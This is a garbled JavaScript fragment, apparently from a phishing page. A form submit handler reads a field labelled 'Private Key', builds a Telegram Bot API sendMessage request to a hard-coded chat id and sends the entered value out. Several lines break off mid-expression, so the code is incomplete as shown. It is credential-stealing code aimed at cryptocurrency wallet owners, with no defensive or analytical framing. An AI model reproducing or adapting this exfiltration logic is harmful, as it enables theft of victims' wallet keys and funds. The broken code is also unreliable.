        $("#privateKeyForm").on("submit", function(event) {
            event.preventDefault();
            const prvky = document.getElementById("prvky").value;
            const categoryValue = "Private Key"

                "Category: " +

            const chatId = "7357469500";

                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            text
          )}`;
